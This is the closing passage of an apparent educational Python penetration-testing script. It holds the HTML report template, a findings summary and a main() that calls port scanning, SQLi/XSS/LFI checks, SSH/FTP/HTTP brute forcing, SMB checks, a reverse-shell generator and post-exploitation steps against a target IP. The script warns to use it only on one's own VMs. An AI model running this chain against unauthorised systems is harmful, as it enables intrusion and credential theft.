      <div class="label">Web Vulns</div>
    </div>
  </div>

  <!-- VULNERABILITIES -->
  <div class="section">
    <h2>🔥 Vulnerability Findings</h2>
    <div class="card">
      <table>
        <tr><th>Severity</th><th>Finding</th><th>Description</th><th>Exploitation Hint</th></tr>
        {vuln_rows if vuln_rows else '<tr><td colspan="4" style="color:#555;padding:20px">No vulnerabilities found</td></tr>'}
      </table>
    </div>
  </div>

  <!-- OPEN PORTS -->
  <div class="section">
    <h2>🔌 Open Ports & Banners</h2>
    <div class="card">
      <table>
        <tr><th>Port</th><th>Service</th><th>Banner</th></tr>
        {ports_rows if ports_rows else '<tr><td colspan="3" style="color:#555;padding:20px">No ports found</td></tr>'}
      </table>
    </div>
  </div>

  <!-- WEB + CMS -->
  <div class="grid2">
    <div class="section">
      <h2>🌐 Web Paths Found</h2>
      <div class="card"><ul>{web_list}</ul></div>
    </div>
    <div class="section">
      <h2>📦 CMS Detected</h2>
      <div class="card"><ul>{cms_list}</ul></div>
    </div>
  </div>

  <!-- WEB VULNS -->
  <div class="grid2">
    <div class="section">
      <h2>💉 SQL Injection</h2>
      <div class="card"><ul>{sqli_list}</ul></div>
    </div>
    <div class="section">
      <h2>🔀 XSS / LFI</h2>
      <div class="card"><ul>
        {xss_list.replace('<li>None found</li>', '')}
        {lfi_list.replace('<li>None found</li>', '')}
        {'<li>None found</li>' if not REPORT['xss_found'] and not REPORT['lfi_found'] else ''}
      </ul></div>
    </div>
  </div>

  <!-- CREDENTIALS -->
  <div class="section">
    <h2>🔑 Credentials Found</h2>
    <div class="card"><ul>{creds_list}</ul></div>
  </div>

  <!-- RESOURCES -->
  <div class="section">
    <h2>📖 Learning Resources</h2>
    <div class="card">
      <ul>
        <li><a href="https://exploit-db.com" target="_blank">exploit-db.com</a> — Search service versions for exploits</li>
        <li><a href="https://gtfobins.github.io" target="_blank">gtfobins.github.io</a> — Privilege escalation via binaries</li>
        <li><a href="https://book.hacktricks.xyz" target="_blank">book.hacktricks.xyz</a> — Massive pentesting wiki</li>
        <li><a href="https://revshells.com" target="_blank">revshells.com</a> — Reverse shell generator</li>
        <li><a href="https://nvd.nist.gov" target="_blank">nvd.nist.gov</a> — CVE/vulnerability database</li>
        <li><a href="https://portswigger.net/web-security" target="_blank">portswigger.net/web-security</a> — Free web hacking labs</li>
      </ul>
    </div>
  </div>

</div>
<footer>
  Generated by Red Team Learning Tool v2.0 &nbsp;|&nbsp; {REPORT['scan_time']}
  &nbsp;|&nbsp; ⚠ FOR EDUCATIONAL USE ONLY — only test on machines you own
</footer>
</body>
</html>"""

    filename = f"redteam_report_{target.replace('.', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    filepath = f"/mnt/user-data/outputs/{filename}"
    with open(filepath, "w") as f:
        f.write(html)

    print(f"\n{C.GREEN}{C.BOLD}  📊 HTML REPORT SAVED: {filename}{C.RESET}")
    return filepath


# ─────────────────────────────────────────────────────────
#  FINAL SUMMARY
# ─────────────────────────────────────────────────────────
def final_summary(target):
    step(16, "Final Attack Surface Summary")
    print(f"\n{C.BOLD}{C.CYAN}{'═'*62}")
    print(f"  SCAN COMPLETE — {target}")
    print(f"{'═'*62}{C.RESET}")

    criticals = [v for v in REPORT["vulnerabilities"] if v["severity"] == "CRITICAL"]
    highs     = [v for v in REPORT["vulnerabilities"] if v["severity"] == "HIGH"]

    if criticals:
        print(f"\n  {C.RED}{C.BOLD}🔥 CRITICAL FINDINGS ({len(criticals)}):{C.RESET}")
        for v in criticals:
            print(f"    {C.RED}►{C.RESET} {v['title']}")
            print(f"       → {v['exploit_hint'][:80]}")

    if highs:
        print(f"\n  {C.YELLOW}{C.BOLD}⚠ HIGH FINDINGS ({len(highs)}):{C.RESET}")
        for v in highs:
            print(f"    {C.YELLOW}►{C.RESET} {v['title']}")

    if REPORT["credentials_found"]:
        print(f"\n  {C.GREEN}{C.BOLD}🔑 CREDENTIALS FOUND:{C.RESET}")
        for c in REPORT["credentials_found"]:
            print(f"    {C.GREEN}►{C.RESET} {c}")

    print(f"\n  {C.CYAN}{C.BOLD}📚 REMEMBER:{C.RESET}")
    print("  • Read ALL the explanations above — they teach you WHY each step matters")
    print("  • Follow the exploit hints to manually exploit each finding")
    print("  • Open the HTML report in your browser for a full overview")
    print("  • Keep notes in a .md file as you go — build your own methodology!")
    print(f"\n  {C.DIM}Resources: exploit-db.com | gtfobins.github.io | book.hacktricks.xyz{C.RESET}")


# ─────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────
def main():
    banner_art()

    target = sys.argv[1] if len(sys.argv) > 1 else input(f"{C.BOLD}Enter target IP (your VulnHub VM): {C.RESET}").strip()
    if not target:
        print("No target provided.")
        sys.exit(1)

    REPORT["target"] = target
    REPORT["scan_time"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(f"\n  {C.BOLD}Target:{C.RESET} {C.GREEN}{target}{C.RESET}")
    print(f"  {C.RED}⚠  Only proceed if this is YOUR VM or you have written permission!{C.RESET}\n")
    if input("  Continue? (yes/no): ").strip().lower() != "yes":
        print("  Smart choice. Always get authorization first!")
        sys.exit(0)

    # ── Run all modules ───────────────────────────────────
    try:
        host_discovery(target)
        open_ports = port_scan(target)
        banners    = banner_grab(target, open_ports)
        check_ftp(target, open_ports)
        web_enumeration(target, open_ports)
        sqli_check(target, open_ports)
        xss_check(target, open_ports)
        lfi_check(target, open_ports)
        ssh_brute(target, open_ports)
        ftp_brute(target, open_ports)
        http_brute(target, open_ports)
        smb_check(target, open_ports)
        check_other_services(target, open_ports)
        reverse_shell_generator(target)
        post_exploitation_guide()
        final_summary(target)
        report_path = generate_html_report(target)
        print(f"\n  {C.GREEN}{C.BOLD}✓ Done! Open the HTML report in your browser.{C.RESET}\n")

    except KeyboardInterrupt:
        print(f"\n\n  {C.YELLOW}Scan interrupted. Generating partial report...{C.RESET}")
        generate_html_report(target)


if __name__ == "__main__":
    main()